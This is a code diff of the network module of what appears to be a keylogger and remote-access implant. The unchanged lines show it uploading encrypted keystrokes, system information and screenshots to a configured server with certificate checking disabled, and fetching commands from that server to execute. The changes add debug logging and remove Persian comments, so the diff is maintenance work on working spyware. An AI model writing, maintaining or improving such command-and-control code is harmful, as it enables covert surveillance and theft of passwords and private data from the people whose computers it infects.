@@ -1,6 +1,7 @@
 # ------------ network/communicator.py ------------
 import requests
 import json
+import logging  # Added import
 from config import Config
 import warnings
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
@@ -16,7 +17,7 @@ class ServerCommunicator:
                 f"{Config.SERVER_URL}/{endpoint}",
                 data=data,
                 files=files,
-                verify=False,  # برای محیط لوکال، بعداً SSL را فعال کنید
+                verify=False,
                 timeout=Config.COMMAND_TIMEOUT
             )
             return self._handle_response(response)
@@ -29,7 +30,7 @@ class ServerCommunicator:
                 data = response.json()
                 if not isinstance(data, dict) or 'commands' not in data:
                     raise CommunicationError("Invalid response format: 'commands' key missing")
-                return data['commands']  # فقط لیست دستورات را برگردانید
+                return data['commands']
             except json.JSONDecodeError:
                 raise CommunicationError("Invalid JSON response")
         else:
@@ -38,7 +39,7 @@ class ServerCommunicator:
     def upload_data(self, keystrokes, system_info, screenshot=None):
         try:
             encrypted_data = {
-                "action": "upload_data",  # اضافه کردن اکشن الزامی
+                "action": "upload_data",
                 "client_id": self.client_id,
                 "token": Config.SECRET_TOKEN,
                 "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
@@ -62,6 +63,7 @@ class ServerCommunicator:
                 
         except Exception as e:
             raise CommunicationError(f"Upload error: {str(e)}")
+
     def fetch_commands(self):
         response = self._send_request(
             "commands",
@@ -71,17 +73,17 @@ class ServerCommunicator:
                 "token": Config.SECRET_TOKEN
             }
         )
-        
-        # اعتبارسنجی ساختار پاسخ
+        logging.info(f"Raw server response for commands: {response}")
         if not isinstance(response, list):
-            raise CommunicationError("Invalid commands format")
-            
+            raise CommunicationError(f"Invalid commands format: {response}")
+        
         validated_commands = []
         for cmd in response:
             if not all(k in cmd for k in ('id', 'command', 'type')):
-                continue  # یا خطا ثبت کنید
+                logging.warning(f"Skipping invalid command: {cmd}")
+                continue
             validated_commands.append(cmd)
-        
+        logging.info(f"Validated commands: {validated_commands}")
         return validated_commands
 
     def send_command_result(self, command_id, result):
